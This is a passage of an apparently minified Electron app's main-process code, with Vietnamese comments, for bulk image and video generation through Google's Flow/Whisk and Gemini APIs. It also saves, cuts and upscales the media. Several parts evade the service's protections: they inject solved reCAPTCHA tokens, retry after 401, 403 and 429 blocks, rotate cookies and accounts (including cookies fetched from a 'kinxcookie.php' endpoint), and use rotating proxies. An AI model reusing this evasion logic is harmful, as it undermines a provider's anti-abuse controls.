        t["x-browser-copyright"] = "Copyright 2026 Google LLC. All Rights Reserved.";
        t["x-browser-year"] = "2026";

        // 3. Thêm vào Body (SỬA LẠI CÁCH ORDER VÀ NESTED MỚI)
        if (h.body) {
          try {
            let bodyObj = typeof h.body === "string" ? JSON.parse(h.body) : h.body;

            // Xóa trường cũ nếu có để tránh conflict
            if (bodyObj.clientContext) {
              delete bodyObj.clientContext.recaptchaToken;
              delete bodyObj.clientContext.recaptchaContext;
            }

            // Tạo recaptchaContext chuẩn
            const recaptchaCtx = {
              token: captchaToken,
              applicationType: "RECAPTCHA_APPLICATION_TYPE_WEB"
            };

            // Cập nhật top-level clientContext mà không làm đảo lộn thứ tự
            bodyObj.clientContext = bodyObj.clientContext || {};
            bodyObj.clientContext.recaptchaContext = recaptchaCtx;

            // THÊM: Inject captcha vào requests[0].clientContext nếu có (Image API - GEM_PIX_2)
            if (bodyObj.requests && bodyObj.requests[0]?.clientContext) {
              bodyObj.requests[0].clientContext.recaptchaContext = recaptchaCtx;
            }

            // Đóng gói lại thành chuỗi
            h.body = JSON.stringify(bodyObj);
          } catch (err) {
            console.error("[Fetch] Lỗi chèn Captcha vào Body:", err);
          }
        }
      } else {
        console.warn("[Fetch] Không lấy được Captcha cho API này.");
      }
    }
    // --- [KẾT THÚC] ---
    if (
      (!t["content-type"] &&
        !i.includes("aisandbox-pa.googleapis.com") &&
        !i.includes("/whisk:")
        ? (t["content-type"] = "application/json")
        : (i.includes("aisandbox-pa.googleapis.com") ||
          i.includes("/whisk:")) &&
        (t["content-type"] = "text/plain;charset=UTF-8")),
      c && c.bearerToken
    ) {
      let n = String(c.bearerToken).trim();
      const u = n.replace(/^Bearer\s+/i, "");
      t["authorization"] = `Bearer ${u}`;
    }
    if (c && c.value && !f.hostname.includes("aisandbox-pa.googleapis.com")) {
      t.Cookie = c.value;
    }
    if (
      f.hostname === "aisandbox-pa.googleapis.com" &&
      !i.includes(":uploadUserImage") &&
      (!t["authorization"] || /^Bearer\s+FLOW_SESSION$/i.test(t["authorization"]))
    ) {
      const authErr = new Error("401: Bearer Token is required for aisandbox API (cookie Flow lỗi hoặc hết hạn).");
      authErr.statusCode = 401;
      throw authErr;
    }
    */
    if (!t["content-type"]) {
      t["content-type"] = "application/json";
    }
    if (c && c.value) {
      t.Cookie = c.value;
    }
    const r = typeof h.body == "object" ? JSON.stringify(h.body) : h.body;

    if (isSessionStopped()) throw new Error("SESSION_STOPPED");

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 300000); // 300s timeout (5 minutes)
    const sessionCtrl = global.currentAbortController;
    const onSessionAbort = () => { try { controller.abort(); } catch (_) { } };
    if (sessionCtrl) {
      if (sessionCtrl.signal.aborted) {
        clearTimeout(timeoutId);
        throw new Error("SESSION_STOPPED");
      }
      sessionCtrl.signal.addEventListener("abort", onSessionAbort, { once: true });
    }

    let l;
    try {
      l = await proxyFetch(i, { ...h, headers: t, body: r, signal: controller.signal });
    } catch (fetchErr) {
      clearTimeout(timeoutId);
      if (sessionCtrl) sessionCtrl.signal.removeEventListener("abort", onSessionAbort);
      if (isSessionStopped() || fetchErr.name === "AbortError") {
        throw new Error("SESSION_STOPPED");
      }
      if (shouldUseProxy(i)) console.error(`[Proxy] cf-workers fail (${fetchErr.message}) — kiểm tra đã deploy worker chưa`);
      // Nếu lỗi kết nối/timeout và chưa retry thì thử lại
      if (!isRetry && !isSessionStopped()) {
        console.warn(`[Fetch] Network Error (${fetchErr.name}), retrying...`);
        return await We(a, { url: i, cookie: c, options: h }, true);
      }
      throw fetchErr;
    }
    clearTimeout(timeoutId);
    if (sessionCtrl) sessionCtrl.signal.removeEventListener("abort", onSessionAbort);
    if (isSessionStopped()) throw new Error("SESSION_STOPPED");

    // --- [BẮT ĐẦU] TỰ ĐỘNG THỬ LẠI NẾU BỊ CHẶN HOẶC HẾT QUOTA (Sửa lỗi 429) ---
    if (!l.ok && (l.status === 403 || l.status === 401 || l.status === 429) && !isRetry && !isSessionStopped()) {
      // Extract threadId để xóa cache
      let bodyData = h.body;
      if (typeof h.body === "string") {
        try { bodyData = JSON.parse(h.body); } catch (e) { }
      }
      const threadId = bodyData?.clientContext?.sessionId || bodyData?.sessionId || "default";

      console.warn(`[Fetch] [Thread-${threadId}] Phát hiện lỗi ${l.status}. Đang lấy Token reCAPTCHA mới và thử lại...`);

      // Xóa cache reCAPTCHA cũ để Solver lấy Token mới cho Cookie mới
      threadTokenCache.delete(threadId);

      // Nếu lỗi 401/429 → KHÔNG đổi cookie trong lúc này.
      // Đổi cookie giữa chừng khiến body còn projectId của project cũ → 404
      // (project không thuộc session cookie mới). Outer loop (processPrompt catch)
      // sẽ refresh cookie + project RIÊNG và tạo lại op từ đầu — luôn nhất quán.
      if (l.status === 401 || l.status === 429) {
        console.warn(`[Fetch] ${l.status} → giữ cookie cũ, lấy captcha mới rồi thử lại 1 lần (outer loop sẽ đổi cookie nếu vẫn lỗi)`);
      }

      // Nghỉ 3 giây để an toàn trước khi dùng tài khoản mới
      await cancellableSleep(3000);
      if (isSessionStopped()) throw new Error("SESSION_STOPPED");

      // Thử lại đệ quy với isRetry = true
      return await We(a, { url: i, cookie: c, options: h }, true);
    }
    // --- [KẾT THÚC] ---

    if (!l.ok) {
      console.error(`[Fetch] ❌ URL: ${i}`);
      console.error(`[Fetch] ❌ Status: ${l.status}`);
      console.error(`[Fetch] ❌ Body gửi lên:`, r ? r.substring(0, 300) : "(empty)");
      const n = await l.text();
      console.error(`[Fetch] API Error: ${i} -> Status ${l.status}`);
      console.error("API Error Response:", n);
      console.error(
        "Request Body sent:",
        r ? r.substring(0, 500) + "..." : "empty"
      );
      const s = Ao.get(i) || "UNKNOWN_API",
        u = new Error(`${l.status} (${s})`);
      throw ((u.statusCode = l.status), (u.details = n), u);
    }
    const e = await l.text(),
      o = l.headers.get("content-type");
    if (e && o && o.includes("application/json")) {
      const parsedJson = JSON.parse(e);
      if (i && i.includes("kinxcookie.php") && parsedJson && parsedJson.success && parsedJson.cookie?.value) {
        global.lastValidKinxCookieResponse = {
          data: parsedJson,
          expiry: Date.now() + 25 * 60 * 1000
        };
      }
      return parsedJson;
    }
    if (e && i.includes("/whisk:"))
      try {
        return JSON.parse(e);
      } catch {
        if (e.toLowerCase().includes("error")) {
          const n = Ao.get(i) || "WHISK_ERROR",
            s = new Error(`${l.status} (${n}) - Whisk Error`);
          throw ((s.statusCode = l.status), (s.details = e), s);
        }
        return (
          console.warn("Whisk API response was not JSON:", e), { rawText: e }
        );
      }
    else return e ? JSON.parse(e) : {};
  } catch (f) {
    if (isSessionStopped() || String(f.message || "").includes("SESSION_STOPPED") || f.name === "AbortError") {
      throw new Error("SESSION_STOPPED");
    }
    const t = Ao.get(i) || "NETWORK_ERROR";

    // Nếu gặp lỗi 403 hoặc 401 và không trong pha retry thì xóa cache (Dự phòng)
    if ((f.statusCode === 403 || f.statusCode === 401) && !isRetry) {
      console.warn(`[Fetch] Luồng xử lý lỗi phát hiện ${f.statusCode}, xóa cache reCAPTCHA token...`);
      // Chúng ta không có threadId ở đây dễ dàng nên xóa toàn bộ hoặc dựa vào We xử lý
      threadTokenCache.clear();
    }

    console.error(
      `Failed to fetch ( ${t})`,
      f.details ? `Details: ${f.details}` : f
    );
    const r = f.details ? ` - API Response: ${f.details}` : "";
    throw new Error(`(${t}): ${f.message}${r}`);
  }
}
he.ipcMain.on("browser:stop-automation", () => {
  console.log("Received stop automation signal.");
  $e = !0;
  Qe = !0;
  uploadMutex = Promise.resolve();
  abortCurrentSession();
});
he.ipcMain.handle(
  "save-image-to-disk",
  async (a, data, path, name, index) => {
    try {
      let i, c, h, f;
      if (data && typeof data === "object" && !Array.isArray(data)) {
        ({ base64Data: i, savePath: c, filename: h, promptIndex: f } = data);
      } else {
        i = data;
        c = path;
        h = name;
        f = index;
      }

      if (!c || !h)
        throw new Error("Đường dẫn lưu hoặc tên file không được cung cấp.");
      const t = ye.extname(h) || ".png",
        r = typeof f == "number" && f >= 0 ? `${f + 1}_` : "";
      let l = ye
        .basename(h, t)
        .substring(0, 30)
        .replace(/[^a-z0-9_]/gi, "_");
      l || (l = "whisk_image");
      const e = `${r}${l}_${Date.now()}${t}`,
        o = ye.join(c, e),
        n = ye.dirname(o);
      be.existsSync(n) || be.mkdirSync(n, { recursive: !0 });
      const s = i.replace(/^data:image\/\w+;base64,/, ""),
        u = Buffer.from(s, "base64");
      return (
        await be.promises.writeFile(o, u),
        console.log(`[save-image-to-disk] Saved image to: ${o}`),
        { success: !0, path: o }
      );
    } catch (t) {
      return (
        console.error("Lỗi khi lưu file ảnh:", t),
        { success: !1, error: t.message }
      );
    }
  }
);
he.ipcMain.on(
  "download-image",
  async (a, { imageDataUrl: i, storyTitle: c }) => {
    const h = he.BrowserWindow.fromWebContents(a.sender);
    if (!h) return;
    const f = `thumbnail_${Date.now()}.png`,
      { canceled: t, filePath: r } = await he.dialog.showSaveDialog(h, {
        title: "Lưu ảnh thumbnail",
        defaultPath: f,
        filters: [{ name: "PNG Images", extensions: ["png"] }],
      });
    if (t || !r) {
      h.webContents.send("download-complete", {
        success: !1,
        error: "Download canceled",
      });
      return;
    }
    try {
      const l = i.replace(/^data:image\/(png|jpeg);base64,/, ""),
        e = Buffer.from(l, "base64");
      be.writeFileSync(r, e),
        h.webContents.send("download-complete", { success: !0, path: r });
    } catch (l) {
      console.error("Image download error:", l),
        h.webContents.send("download-complete", {
          success: !1,
          error: l.message,
        });
    }
  }
);
he.ipcMain.handle("select-download-directory", async (a) => {
  const i = he.BrowserWindow.fromWebContents(a.sender),
    { canceled: c, filePaths: h } = await he.dialog.showOpenDialog(i, {
      properties: ["openDirectory"],
    });
  return c || h.length === 0 ? null : h[0];
});
function rc(a) {
  return a.charCodeAt(0) === 65279 ? a.slice(1) : a;
}
he.ipcMain.handle("import-prompts-from-file", async (a) => {
  const i = he.BrowserWindow.fromWebContents(a.sender);
  if (!i) return { success: !1, error: "Main window not found" };
  const { canceled: c, filePaths: h } = await he.dialog.showOpenDialog(i, {
    title: "Chọn file .txt chứa prompts",
    filters: [{ name: "Text Files", extensions: ["txt"] }],
    properties: ["openFile"],
  });
  if (c || h.length === 0) return { success: !1, error: "No file selected" };
  try {
    const f = h[0],
      t = rc(be.readFileSync(f, "utf-8"));
    let r = [];
    try {
      const l = JSON.parse(t);
      let e = [];
      if (Array.isArray(l)) e = l;
      else if (typeof l == "object" && l !== null && Array.isArray(l.prompts))
        e = l.prompts;
      else throw new Error("Nội dung JSON không phải là mảng, xử lý như text.");
      if (
        ((r = e
          .map((o) =>
            typeof o == "object" && o !== null
              ? JSON.stringify(o, null, 2)
              : typeof o == "string"
                ? o
                : null
          )
          .filter((o) => o !== null && o.trim() !== "")),
          r.length > 0)
      )
        return { success: !0, prompts: r };
      throw new Error("Mảng JSON không chứa prompt hợp lệ nào.");
    } catch {
      if (((r = t.split(/\r?\n/).filter((e) => e.trim() !== "")), r.length > 0))
        return { success: !0, prompts: r };
      throw new Error("Không tìm thấy nội dung hợp lệ nào trong tệp.");
    }
  } catch (f) {
    return (
      console.error("File import error:", f), { success: !1, error: f.message }
    );
  }
});
he.ipcMain.handle("import-prompts-from-json", async (a) => {
  const i = he.BrowserWindow.fromWebContents(a.sender);
  if (!i) return { success: !1, error: "Main window not found" };
  const { canceled: c, filePaths: h } = await he.dialog.showOpenDialog(i, {
    title: "Chọn file .json chứa prompts",
    filters: [{ name: "JSON Files", extensions: ["json"] }],
    properties: ["openFile"],
  });
  if (c || h.length === 0) return { success: !1, error: "No file selected" };
  try {
    const f = h[0],
      t = rc(be.readFileSync(f, "utf-8")),
      r = JSON.parse(t);
    let l = [];
    if (Array.isArray(r)) l = r;
    else if (typeof r == "object" && r !== null && Array.isArray(r.prompts))
      l = r.prompts;
    else
      throw new Error(
        'Định dạng JSON không hợp lệ. Cần một mảng (array) hoặc object chứa key "prompts".'
      );
    const e = l
      .map((o) =>
        typeof o == "object" && o !== null
          ? JSON.stringify(o, null, 2)
          : typeof o == "string"
            ? o
            : null
      )
      .filter((o) => o !== null && o.trim() !== "");
    if (e.length === 0)
      throw new Error("Không tìm thấy prompt hợp lệ nào trong tệp JSON.");
    return { success: !0, prompts: e };
  } catch (f) {
    return (
      console.error("JSON import error:", f),
      {
        success: !1,
        error:
          f instanceof SyntaxError
            ? `Lỗi phân tích cú pháp JSON: ${f.message}`
            : `Lỗi đọc hoặc xử lý file: ${f.message}`,
      }
    );
  }
});
he.ipcMain.handle("get-app-version", () => he.app.getVersion());
he.ipcMain.handle("video:stop-cut", () => { return { success: true }; });
he.ipcMain.handle("video:extract-frames", async (event, { videoPath, outputDir, frameRate = 1, format = "jpg" }) => {
  try {
    if (!be.existsSync(videoPath)) {
      return { success: false, error: "Video file not found" };
    }

    const outDir = outputDir || ye.dirname(videoPath);
    if (!be.existsSync(outDir)) {
      be.mkdirSync(outDir, { recursive: true });
    }
    const outputPath = ye.join(outDir, "frame_%04d." + format);

    return new Promise((resolve) => {
      jo(videoPath)
        .outputOptions([
          "-vf", `fps=${frameRate}`,
          "-q:v", "2"
        ])
        .save(outputPath)
        .on("end", () => {
          console.log(`[FFmpeg] Extracted frames from ${videoPath} to ${outputDir}`);
          resolve({ success: true, outputPattern: outputPath });
        })
        .on("error", (err) => {
          console.error("[FFmpeg] Frame extraction error:", err.message);
          resolve({ success: false, error: err.message });
        });
    });
  } catch (error) {
    console.error("Extract frames error:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("get-video-metadata", async (event, videoPath) => {
  try {
    if (!be.existsSync(videoPath)) {
      return { success: false, error: "Video file not found" };
    }

    return new Promise((resolve) => {
      jo.ffprobe(videoPath, (err, metadata) => {
        if (err) {
          console.error("[FFprobe] Error reading video metadata:", err.message);
          resolve({ success: false, error: err.message });
          return;
        }

        const stream = metadata.streams.find(s => s.codec_type === "video");
        const audioStream = metadata.streams.find(s => s.codec_type === "audio");

        resolve({
          success: true,
          metadata: {
            duration: metadata.format.duration,
            size: metadata.format.size,
            format: metadata.format.format_name,
            videoCodec: stream?.codec_name,
            width: stream?.width,
            height: stream?.height,
            frameRate: stream?.r_frame_rate,
            audioCodec: audioStream?.codec_name,
            audioChannels: audioStream?.channels,
            audioSampleRate: audioStream?.sample_rate
          }
        });
      });
    });
  } catch (error) {
    console.error("Get video metadata error:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("get-loadable-video-src", async (event, videoPath) => {
  try {
    if (!be.existsSync(videoPath)) {
      return { success: false, error: "Video file not found" };
    }

    // Convert to file:// URL for Electron to load
    const fileUrl = `file://${videoPath.replace(/\\/g, "/")}`;
    return { success: true, src: fileUrl };
  } catch (error) {
    console.error("Get loadable video src error:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("video:cut", async (event, { videoPath, startTime, endTime, outputPath }) => {
  try {
    if (!be.existsSync(videoPath)) {
      return { success: false, error: "Video file not found" };
    }

    const outDir = ye.dirname(outputPath);
    if (!be.existsSync(outDir)) {
      be.mkdirSync(outDir, { recursive: true });
    }

    return new Promise((resolve) => {
      jo(videoPath)
        .setStartTime(startTime)
        .setDuration(endTime - startTime)
        .outputOptions(["-c", "copy"]) // Copy codec for speed
        .save(outputPath)
        .on("end", () => {
          console.log(`[FFmpeg] Video cut from ${startTime}s to ${endTime}s saved to ${outputPath}`);
          resolve({ success: true, outputPath });
        })
        .on("error", (err) => {
          console.error("[FFmpeg] Video cut error:", err.message);
          resolve({ success: false, error: err.message });
        });
    });
  } catch (error) {
    console.error("Video cut error:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("studio:save-characters", async (event, characters) => {
  try {
    const userDataPath = he.app.getPath("userData");
    const filePath = ye.join(userDataPath, "characters_studio.json");
    be.writeFileSync(filePath, JSON.stringify(characters), "utf8");
    return { success: true };
  } catch (err) {
    console.error("Lỗi khi lưu nhân vật:", err);
    return { success: false, error: err.message };
  }
});

he.ipcMain.handle("studio:load-characters", async () => {
  try {
    const userDataPath = he.app.getPath("userData");
    const filePath = ye.join(userDataPath, "characters_studio.json");
    if (be.existsSync(filePath)) {
      const data = be.readFileSync(filePath, "utf8");
      return JSON.parse(data);
    }
    return [];
  } catch (err) {
    console.error("Lỗi khi tải nhân vật:", err);
    return [];
  }
});

he.ipcMain.handle("studio:import-characters-from-folder", async (event) => {
  try {
    const i = he.BrowserWindow.fromWebContents(event.sender);
    const { canceled: c, filePaths: h } = await he.dialog.showOpenDialog(i, {
      properties: ["openDirectory"],
      title: "Chọn thư mục chứa ảnh nhân vật"
    });

    if (c || h.length === 0) return null;

    const folderPath = h[0];
    const files = be.readdirSync(folderPath);
    const characters = [];
    const imageExtensions = [".jpg", ".jpeg", ".png", ".webp", ".bmp"];

    for (const file of files) {
      const ext = ye.extname(file).toLowerCase();
      if (imageExtensions.includes(ext)) {
        const filePath = ye.join(folderPath, file);
        const stats = be.statSync(filePath);
        if (stats.isFile()) {
          const buffer = be.readFileSync(filePath);
          const base64 = `data:image/${ext.substring(1).replace("jpg", "jpeg")};base64,${buffer.toString("base64")}`;
          const name = ye.basename(file, ext);
          characters.push({
            id: _r.randomUUID(),
            name: name,
            imageBase64: base64
          });
        }
      }
    }
    return { characters, folderPath };
  } catch (err) {
    console.error("Lỗi khi import nhân vật từ thư mục:", err);
    return null;
  }
});

he.ipcMain.on("download-video", async (event, { url, promptText }) => {
  try {
    const window = he.BrowserWindow.fromWebContents(event.sender);
    const { filePath } = await he.dialog.showSaveDialog(window, {
      title: "Lưu Video",
      defaultPath: `video_${Date.now()}.mp4`,
      filters: [{ name: "Movies", extensions: ["mp4"] }]
    });

    if (filePath) {
      const fetchFn = global.fetch || require("node-fetch");
      const response = await fetchFn(url);
      const buffer = Buffer.from(await response.arrayBuffer());
      be.writeFileSync(filePath, buffer);
      event.reply("download-status", { success: true, path: filePath });
    }
  } catch (err) {
    console.error("Lỗi download video:", err);
    event.reply("download-status", { success: false, error: err.message });
  }
});

he.ipcMain.handle("commerce:save-tasks", async (event, tasks) => {
  try {
    const userDataPath = he.app.getPath("userData");
    const filePath = ye.join(userDataPath, "commerce_tasks.json");
    be.writeFileSync(filePath, JSON.stringify(tasks), "utf8");
    return { success: true };
  } catch (err) {
    return { success: false, error: err.message };
  }
});

he.ipcMain.handle("download-and-save-video", async (event, { videoUrl, prompt, savePath, index, config }) => {
  try {
    if (!be.existsSync(savePath)) be.mkdirSync(savePath, { recursive: true });
    const filename = `video_${index}_${Date.now()}.mp4`;
    const filePath = ye.join(savePath, filename);
    const fetchFn = global.fetch || require("node-fetch");
    const response = await fetchFn(videoUrl);
    const buffer = Buffer.from(await response.arrayBuffer());
    be.writeFileSync(filePath, buffer);
    console.log(`[Main] Auto-save video success: ${filePath}`);
    return { success: true, filePath };
  } catch (err) {
    console.error("Lỗi lưu video tự động:", err);
    return { success: false, error: err.message };
  }
});

he.ipcMain.handle("commerce:load-tasks", async () => {
  try {
    const userDataPath = he.app.getPath("userData");
    const filePath = ye.join(userDataPath, "commerce_tasks.json");
    if (be.existsSync(filePath)) {
      return JSON.parse(be.readFileSync(filePath, "utf8"));
    }
    return null;
  } catch (err) {
    return null;
  }
});

he.ipcMain.handle("studio:save-character-image", async (event, { folderPath, name, base64 }) => {
  try {
    if (!folderPath || !be.existsSync(folderPath)) return { success: false, error: "Thư mục không tồn tại" };
    const matches = base64.match(/^data:image\/([A-Za-z-+\/]+);base64,(.+)$/);
    if (!matches || matches.length !== 3) return { success: false, error: "Định dạng ảnh không hợp lệ" };
    const extension = matches[1].replace("jpeg", "jpg");
    const data = Buffer.from(matches[2], "base64");
    const safeName = name.replace(/[<>:"/\\|?*]/g, "_");
    let fileName = `${safeName}.${extension}`;
    let filePath = ye.join(folderPath, fileName);
    let counter = 1;
    while (be.existsSync(filePath)) {
      fileName = `${safeName}_${counter}.${extension}`;
      filePath = ye.join(folderPath, fileName);
      counter++;
    }
    be.writeFileSync(filePath, data);
    return { success: true, filePath };
  } catch (err) {
    console.error("Lỗi khi lưu ảnh nhân vật vào thư mục:", err);
    return { success: false, error: err.message };
  }
});

// Gemini API handlers
he.ipcMain.handle("gemini:save-api-key", async (event, payload) => {
  try {
    const { apiKey, proxyKey } = payload || {};
    const userDataPath = he.app.getPath("userData");
    const configPath = ye.join(userDataPath, "gemini_config.json");
    const config = be.existsSync(configPath) ? JSON.parse(be.readFileSync(configPath, "utf8")) : {};
    if (apiKey !== undefined) config.apiKey = apiKey;
    if (proxyKey !== undefined) config.proxyKey = proxyKey;
    be.writeFileSync(configPath, JSON.stringify(config, null, 2), "utf8");
    // Reset cache + dừng rotation timer cũ
    if (proxyKey !== undefined) {
      proxyDispatcher = null;
      stopProxyRotation();
    }
    return { success: true };
  } catch (error) {
    console.error("Error saving Gemini API key:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("gemini:get-api-key", async () => {
  try {
    const userDataPath = he.app.getPath("userData");
    const configPath = ye.join(userDataPath, "gemini_config.json");
    if (be.existsSync(configPath)) {
      const config = JSON.parse(be.readFileSync(configPath, "utf8"));
      return { success: true, apiKey: config.apiKey || "", proxyKey: config.proxyKey || "" };
    }
    return { success: true, apiKey: "", proxyKey: "" };
  } catch (error) {
    console.error("Error getting Gemini API key:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("gemini:test-api-key", async (event, apiKey) => {
  try {
    const testUrl = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent?key=" + apiKey;
    const response = await proxyFetch(testUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ contents: [{ parts: [{ text: "Hello" }] }] }),
      timeout: 10000
    });
    if (response.ok) {
      return { success: true, valid: true };
    } else {
      return { success: true, valid: false, status: response.status };
    }
  } catch (error) {
    console.error("Error testing Gemini API key:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("gemini:generate-image", async (event, { prompt, apiKey, model = "gemini-2.0-flash-exp", width = 1024, height = 1024 }) => {
  try {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`;
    const payload = {
      contents: [{
        parts: [{
          text: `Generate an image with description: ${prompt}. The image should be ${width}x${height}.`
        }]
      }],
      generationConfig: {
        temperature: 0.7,
        topP: 0.95,
        topK: 40
      }
    };

    const response = await proxyFetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`API error: ${response.status} - ${errorText}`);
    }

    const result = await response.json();
    return { success: true, data: result };
  } catch (error) {
    console.error("Error generating image with Gemini:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("gemini:generate-video", async (event, { prompt, apiKey, model = "gemini-2.0-flash-exp-image-generation", duration = 5 }) => {
  try {
    const url = `https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${apiKey}`;
    const payload = {
      contents: [{
        parts: [{
          text: `Generate a ${duration}-second video with description: ${prompt}.`
        }]
      }],
      generationConfig: {
        temperature: 0.7,
        topP: 0.95,
        topK: 40
      }
    };

    const response = await proxyFetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`API error: ${response.status} - ${errorText}`);
    }

    const result = await response.json();
    return { success: true, data: result };
  } catch (error) {
    console.error("Error generating video with Gemini:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("gemini:poll-video-operation", async (event, operationName, apiKey) => {
  try {
    const url = `https://generativelanguage.googleapis.com/v1/${operationName}?key=${apiKey}`;
    const response = await proxyFetch(url);
    if (!response.ok) {
      throw new Error(`Polling error: ${response.status}`);
    }
    const result = await response.json();
    return { success: true, operation: result };
  } catch (error) {
    console.error("Error polling video operation:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("gemini:download-video", async (event, videoUri, apiKey) => {
  try {
    // Extract video ID from URI
    const videoId = videoUri.split('/').pop();
    const url = `https://generativelanguage.googleapis.com/v1beta/media/${videoId}?key=${apiKey}`;
    const response = await proxyFetch(url);
    if (!response.ok) {
      throw new Error(`Download error: ${response.status}`);
    }
    const buffer = await response.arrayBuffer();
    return { success: true, buffer: Buffer.from(buffer) };
  } catch (error) {
    console.error("Error downloading video:", error);
    return { success: false, error: error.message };
  }
});

const s0 = (n, e, u, win = null, pId = null) =>
  new Promise((f, o) => {
    jo.ffprobe(n, (a, t) => {
      if (a) {
        console.error("[FFprobe] Lỗi đọc metadata:", a);
        o(a);
        return;
      }
      const r = t.streams.find((w) => w.codec_type === "video"),
        i = r?.width || 0,
        h = r?.height || 0,
        s = h > i;
      let p = 1920,
        c = 1080;
      u === "1080p"
        ? ((p = s ? 1080 : 1920), (c = s ? 1920 : 1080))
        : u === "2k"
          ? ((p = s ? 1440 : 2560), (c = s ? 2560 : 1440))
          : u === "4k" && ((p = s ? 2160 : 3840), (c = s ? 3840 : 2160));

      // Đảm bảo kích thước chia hết cho 2
      p = Math.floor(p / 2) * 2;
      c = Math.floor(c / 2) * 2;

      const hasAudio = (t.streams || []).some((w) => w.codec_type === "audio");
      const audioOptions = hasAudio ? ["-c:a", "copy"] : ["-an"];

      console.log(
        `[FFmpeg] Upscale video ${s ? "DỌC" : "NGANG"} lên ${u} (${p}x${c}), audio: ${hasAudio ? "copy" : "none"}...`
      );

      const vfFilter = `scale=${p}:${c}:flags=lanczos:force_original_aspect_ratio=decrease,pad=${p}:${c}:(ow-iw)/2:(oh-ih)/2,format=yuv420p`;

      jo(n)
        .outputOptions([
          "-vf",
          vfFilter,
          "-c:v",
          "libx264",
          "-preset",
          "veryfast",
          "-crf",
          "17",
          ...audioOptions,
          "-movflags",
          "+faststart",
        ])
        .save(e)
        .on("progress", (progress) => {
          if (progress && progress.percent) {
            const pct = Math.round(progress.percent);
            if (win && !win.isDestroyed()) {
              if (pId) {
                win.webContents.send("browser:log", {
                  promptId: pId,
                  message: `Đang nâng cấp ${u} (${pct}%)...`,
                  status: "processing",
                });
              }
              win.webContents.send("download-progress", {
                percent: pct,
                resolution: u,
                promptId: pId,
              });
            }
          }
        })
        .on("end", () => {
          console.log(`[FFmpeg] Upscale thành công: ${e}`);
          f();
        })
        .on("error", (w) => {
          console.error("[FFmpeg] Lỗi upscale:", w);
          o(w);
        });
    });
  });

const Ho = async (a, i, c, h, f, t, pId) => {
  let r = null,
    l = h,
    isCustomFileChosen = false;
  if (t && t.enabled && t.path) (l = t.path), (r = l);
  else if (h) (r = h), (l = ye.dirname(h));
  else {
    const e = `${f + 1}_${Date.now()}.mp4`,
      { canceled: o, filePath: n } = await he.dialog.showSaveDialog(a, {
        title: "Lưu video",
        defaultPath: e,
        filters: [{ name: "MP4 Videos", extensions: ["mp4"] }],
      });
    if (o || !n)
      return (
        a.webContents.send("download-complete", {
          success: !1,
          error: "Download canceled",
        }),
        { success: !1, error: "Download canceled" }
      );
    (r = n), (l = ye.dirname(n)), (isCustomFileChosen = true);
  }
  if (r && l)
    try {
      if (!isCustomFileChosen) {
        if (t && t.enabled && t.splitFolders && t.videosPerFolder > 0) {
          const u = Math.floor(f / t.videosPerFolder) + 1;
          l = ye.join(l, `Phần ${u}`);
        }
        l &&
          !be.existsSync(l) &&
          (be.mkdirSync(l, { recursive: !0 }),
            console.log(`Đã tạo thư mục (hoặc đã tồn tại): ${l}`));
        const e = f + 1,
          o = Date.now();
        let n = `${e}_${o}.mp4`;
        try {
          const u = JSON.parse(c);
          if (u.scene) {
            const m = String(u.scene).replace(/[^a-zA-Z0-9_-]/g, "");
            m.length > 0 && m.length < 20 && (n = `${m}_${o}.mp4`);
          }
        } catch { }
        let s = ye.join(l, n);
        if (be.existsSync(s))
          if (t && t.allowOverwrite === !0) {
            const u = `${o}_${Math.floor(Math.random() * 1e3)}`,
              m = ye.extname(n);
            (n = `${ye.basename(n, m).split("_")[0]}_${u}${m}`),
              (r = ye.join(l, n)),
              console.log(`File gốc tồn tại, không cho phép đè. Lưu thành: ${n}`);
          } else {
            (r = s),
              console.log(
                `File gốc tồn tại, chế độ xóa file cũ đang BẬT. Xóa file cũ: ${n}`
              );
            try {
              be.unlinkSync(s), console.log(`Đã xóa file cũ thành công: ${s}`);
            } catch (u) {
              console.error(`Không thể xóa file cũ ${s}: ${u.message}`);
            }
          }
        else r = s;
      }
    } catch (e) {
      const o = {
        success: !1,
        error: "Lỗi khi xử lý thư mục hoặc tên tệp lưu.",
      };
      return (
        console.error("Directory/Filename handling error:", e),
        a.webContents.send("download-complete", o),
        o
      );
    }
  else {
    const e = { success: !1, error: "Không thể xác định đường dẫn lưu file." };
    return (
      console.error("Save path determination error."),
      a.webContents.send("download-complete", e),
      e
    );
  }
  try {
    const resSetting = t ? (t.upscaleResolution || t.resolution) : null;
    const isUpscale =
      t &&
      (t.isUpscale || ["1080p", "2k", "4k"].includes(t.resolution) || ["1080p", "2k", "4k"].includes(t.upscaleResolution)) &&
      resSetting &&
      resSetting !== "original" &&
      resSetting !== "720p";
    let finalSavePath = r;
    let downloadPath = r;

    if (isUpscale) {
      downloadPath = ye.join(Ar.tmpdir(), `temp_orig_${Date.now()}.mp4`);
      console.log(
        `[Upscale] Tải video gốc về: ${downloadPath} (để nâng lên ${resSetting})`
      );
    }

    const e = await fetch(i);
    if (!e.ok) throw new Error(`Failed to fetch video: ${e.statusText}`);
    const o = await e.arrayBuffer(),
      n = Buffer.from(o);
    be.writeFileSync(downloadPath, n);

    if (isUpscale) {
      if (pId) {
        a.webContents.send("browser:log", {
          promptId: pId,
          message: `Đang nâng cấp ${resSetting}...`,
          status: "processing",
        });
      }
